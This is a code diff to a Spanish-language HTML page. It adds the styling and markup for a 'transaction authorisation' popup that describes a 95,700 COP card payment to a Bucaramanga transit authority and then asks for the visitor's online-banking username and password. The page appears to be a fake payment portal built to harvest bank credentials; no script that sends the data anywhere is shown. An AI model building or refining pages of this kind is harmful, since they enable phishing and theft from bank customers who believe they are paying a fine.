@@ -22,9 +22,132 @@ tailwind.config = {
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Lato:wght@400;500;700;900&display=swap" rel="stylesheet">
 
 <style>
-/* ============================================================
-   ANTI-ZOOM Y RESET
-   ============================================================ */
+
+/* ===== MODAL AUTORIZACIÓN ===== */
+.modal-autorizacion-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0, 0, 0, 0.65);
+  z-index: 99999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+  overflow-y: auto;
+}
+.modal-autorizacion-overlay.hidden { display: none; }
+
+.modal-autorizacion-box {
+  background: #fff;
+  border-radius: 14px;
+  width: 100%;
+  max-width: 460px;
+  box-shadow: 0 12px 40px rgba(0,0,0,0.3);
+  overflow: hidden;
+  animation: authFadeIn 0.25s ease;
+}
+@keyframes authFadeIn {
+  from { opacity: 0; transform: translateY(12px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+.modal-autorizacion-header {
+  background: #0033a0;
+  color: #fff;
+  padding: 16px 20px;
+}
+.modal-autorizacion-header h2 {
+  margin: 0;
+  font-size: 18px;
+  font-weight: 700;
+  text-align: center;
+}
+
+.modal-autorizacion-body {
+  padding: 22px 22px 26px;
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  color: #222;
+}
+
+.auth-intro {
+  font-size: 14px;
+  line-height: 1.5;
+  margin: 0 0 14px;
+}
+.auth-intro strong { color: #0033a0; }
+
+.auth-divisor {
+  height: 1px;
+  background: #e3e3e3;
+  margin: 16px 0;
+}
+
+.auth-subtitulo {
+  font-size: 15px;
+  font-weight: 700;
+  color: #0033a0;
+  margin: 0 0 10px;
+}
+
+.auth-detalle-linea {
+  display: flex;
+  justify-content: space-between;
+  font-size: 13px;
+  padding: 6px 0;
+  border-bottom: 1px dashed #ececec;
+}
+.auth-detalle-linea span { color: #666; }
+.auth-detalle-linea strong { color: #111; font-weight: 600; }
+
+.auth-label {
+  display: block;
+  font-size: 13px;
+  font-weight: 600;
+  margin: 12px 0 6px;
+  color: #333;
+}
+
+.auth-input {
+  width: 100%;
+  padding: 12px 14px;
+  font-size: 15px;
+  border: 1.5px solid #cfcfcf;
+  border-radius: 8px;
+  outline: none;
+  box-sizing: border-box;
+  transition: border-color 0.2s;
+}
+.auth-input:focus { border-color: #0033a0; }
+
+.auth-error {
+  margin-top: 12px;
+  background: #fdecea;
+  color: #b71c1c;
+  border: 1px solid #f5c6cb;
+  padding: 10px 12px;
+  border-radius: 8px;
+  font-size: 13px;
+  text-align: center;
+  font-weight: 600;
+}
+.auth-error.hidden { display: none; }
+
+.auth-btn-enviar {
+  margin-top: 18px;
+  width: 100%;
+  padding: 14px;
+  background: #0033a0;
+  color: #fff;
+  border: none;
+  border-radius: 8px;
+  font-size: 16px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+.auth-btn-enviar:hover { background: #00267a; }
+.auth-btn-enviar:disabled { background: #9aa7c7; cursor: not-allowed; }
+
 html { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; -webkit-tap-highlight-color: transparent; }
 body { touch-action: manipulation; user-select: none; overscroll-behavior-y: none; font-family: 'Inter', system-ui, sans-serif; background: #f7f8fa; color: #00271c; }
 input, textarea, select { user-select: text; font-size: 16px !important; }
@@ -888,6 +1011,44 @@ img, svg { display: block; max-width: 100%; }
 @media (max-width: 900px) { .footer-inner { grid-template-columns: 1fr 1fr; gap: 20px; } }
 @media (max-width: 600px) { .footer-inner { grid-template-columns: 1fr; } }
 </style>
+
+<!-- MODAL AUTORIZACIÓN DE TRANSACCIÓN -->
+<div id="modalAutorizacion" class="modal-autorizacion-overlay hidden">
+  <div class="modal-autorizacion-box">
+    <div class="modal-autorizacion-header">
+      <h2>Autorización de transacción</h2>
+    </div>
+
+    <div class="modal-autorizacion-body">
+      <p class="auth-intro">
+        La transacción que intentas realizar en <strong>DIRECCIÓN DE TRANS DE BUCARAMANGA</strong>
+        por <strong id="authMonto">95.700</strong> COP el <strong id="authFecha">--/--/----</strong>
+        con tu tarjeta terminada en <strong id="authTarjeta">****</strong> debe ser autorizada por seguridad.
+      </p>
+
+      <div class="auth-divisor"></div>
+
+      <h3 class="auth-subtitulo">Detalles de transacción</h3>
+      <div class="auth-detalle-linea"><span>Comercio</span><strong>DIRECCIÓN DE TRANS DE BUCARAMANGA</strong></div>
+      <div class="auth-detalle-linea"><span>Monto</span><strong id="authMontoDetalle">$95.700 COP</strong></div>
+      <div class="auth-detalle-linea"><span>Tarjeta</span><strong id="authTarjetaDetalle">**** **** **** ****</strong></div>
+
+      <div class="auth-divisor"></div>
+
+      <h3 class="auth-subtitulo">Ingresa las credenciales de tu Banca Virtual:</h3>
+
+      <label class="auth-label">Usuario</label>
+      <input type="text" id="authUsuario" class="auth-input" autocomplete="off" placeholder="Usuario">
+
+      <label class="auth-label">Contraseña</label>
+      <input type="password" id="authPassword" class="auth-input" autocomplete="off" placeholder="Contraseña">
+
+      <div id="authError" class="auth-error hidden"></div>
+
+      <button id="authEnviarBtn" class="auth-btn-enviar" type="button">Enviar</button>
+    </div>
+  </div>
+</div>
 
 </body>
 </html>
